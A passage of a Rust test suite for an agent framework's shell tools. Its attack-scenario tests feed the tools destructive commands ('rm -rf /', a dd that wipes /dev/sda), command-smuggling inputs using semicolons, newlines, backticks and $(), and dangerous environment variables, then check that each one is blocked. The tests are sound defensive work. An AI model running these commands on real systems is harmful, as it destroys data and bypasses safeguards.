    async fn safe_shell_tool_name() {
        let tool = SafeShellTool::new();
        assert_eq!(tool.name(), "safe_shell");
    }

    #[tokio::test]
    async fn shell_tool_name() {
        let tool = ShellTool::new();
        assert_eq!(tool.name(), "shell");
    }

    #[tokio::test]
    async fn bash_tool_name() {
        let tool = kkr_tool_shell::BashTool::new();
        assert_eq!(tool.name(), "bash");
    }

    #[tokio::test]
    async fn safe_shell_metadata_is_read_only() {
        let tool = SafeShellTool::new();
        let meta = tool.metadata();
        assert!(meta.read_only);
    }

    #[tokio::test]
    async fn shell_metadata_is_not_read_only() {
        let tool = ShellTool::new();
        let meta = tool.metadata();
        assert!(!meta.read_only);
    }

    #[tokio::test]
    async fn timeout_enforced() {
        let tool = ShellTool::new().timeout(1);
        let ctx = default_ctx();
        let result = tool
            .execute(json!({"command": "sleep 10", "timeout": 1}), &ctx)
            .await;
        // Should timeout — returns a Tool error with "timed out" message.
        match result {
            Err(kkr_core::Error::Tool { message, .. }) => {
                assert!(
                    message.contains("timed out"),
                    "Expected timeout message, got: {}",
                    message
                );
            }
            other => panic!("Expected Tool timeout error, got: {:?}", other),
        }
    }

    #[tokio::test]
    async fn all_tools_returns_three() {
        let tools = kkr_tool_shell::all_tools();
        assert_eq!(tools.len(), 3);
        let names: Vec<&str> = tools.iter().map(|t| t.name()).collect();
        assert!(names.contains(&"shell"));
        assert!(names.contains(&"bash"));
        assert!(names.contains(&"safe_shell"));
    }
}

// ===========================================================================
// 9. Compound / attack-scenario tests
// ===========================================================================
mod attack_scenario_tests {
    use super::*;

    #[tokio::test]
    async fn allowlist_bypass_via_path_with_operator() {
        // Attempt: /bin/ls ; /bin/rm -rf /
        // extract_base_command sees "ls" from first segment — allowed.
        // But has_unquoted_shell_operators catches the semicolon.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "/bin/ls ; /bin/rm -rf /"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn allowlist_bypass_via_newline_injection() {
        // Newline is a command separator in shell. extract_base_command splits
        // on '\n' so the first segment is checked. But the newline itself should
        // cause issues in allowlist mode because it creates a second command
        // that bypasses the allowlist. Let's verify the behavior:
        // The newline is a split char for extract_base_command but not for
        // has_unquoted_shell_operators. This is a potential edge case.
        let tool = SafeShellTool::new();
        let ctx = default_ctx();
        // With a newline, this effectively becomes two commands. But
        // extract_base_command only checks the first. The has_unquoted_shell_operators
        // function does not check for newline (it is not in the matches! list).
        // This would be a bypass if someone could inject a newline. However,
        // in practice the command is passed as a single shell argument, so sh -c
        // will execute both. This test documents the current behavior.
        let result = tool
            .execute(
                json!({"command": "echo hello\nrm -rf /"}),
                &ctx,
            )
            .await;
        // The command should either be blocked or, if it runs, "rm -rf /" is
        // blocked by the blocked_patterns check (which happens before allowlist check).
        // Actually, "rm -rf /" is in blocked_patterns which applies regardless.
        assert!(result.is_err(), "Newline-injected dangerous command should be blocked");
    }

    #[tokio::test]
    async fn env_injection_through_all_three_sources() {
        // Verify that env validation catches blocked vars from all three
        // sources: tool.env, params.env, ctx.env.

        // Source 1: tool.env
        let tool1 = ShellTool::new().env("PROMPT_COMMAND", "evil");
        let ctx = default_ctx();
        assert!(tool1.execute(json!({"command": "echo hi"}), &ctx).await.is_err());

        // Source 2: params.env
        let tool2 = ShellTool::new();
        assert!(
            tool2
                .execute(
                    json!({"command": "echo hi", "env": {"SHELLOPTS": "evil"}}),
                    &ctx,
                )
                .await
                .is_err()
        );

        // Source 3: ctx.env
        let tool3 = ShellTool::new();
        let ctx3 = ToolContext::new().with_env("BASHOPTS", "evil");
        assert!(tool3.execute(json!({"command": "echo hi"}), &ctx3).await.is_err());
    }

    #[tokio::test]
    async fn blocked_pattern_within_longer_command() {
        // "rm -rf /" is a substring of a longer command — should still match.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "sudo rm -rf / --no-preserve-root"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn blocked_pattern_with_extra_args_around() {
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "nice -n 19 dd if=/dev/zero of=/dev/sda bs=1M"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn safe_shell_blocked_pattern_still_applies() {
        // SafeShellTool inherits blocked patterns from ShellTool.
        // Even if somehow "rm" was in the allowlist, the blocked patterns
        // should prevent "rm -rf /".
        let tool = ShellTool::new()
            .allow_commands(vec!["rm".to_string()])
            .block_pattern("rm -rf /");
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "rm -rf /"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn backtick_injection_in_unrestricted_but_with_blocked_content() {
        // In unrestricted mode, backticks are not checked (no operator check).
        // But the blocked pattern "rm -rf /" inside backticks would NOT be
        // caught because it is inside the backtick expression, not the top level.
        // This is a known limitation — blocked patterns check the normalized
        // string as a whole. Let's verify "echo `rm -rf /`" is actually blocked
        // because the substring "rm -rf /" appears in the normalized command.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo `rm -rf /`"}),
            &ctx,
        )
        .await;
    }

    #[tokio::test]
    async fn dollar_paren_injection_with_blocked_content() {
        // Same logic as above: "$(rm -rf /)" contains the blocked substring.
        let tool = ShellTool::new();
        let ctx = default_ctx();
        assert_security_error(
            &tool,
            json!({"command": "echo $(rm -rf /)"}),
            &ctx,
        )
        .await;
    }
}
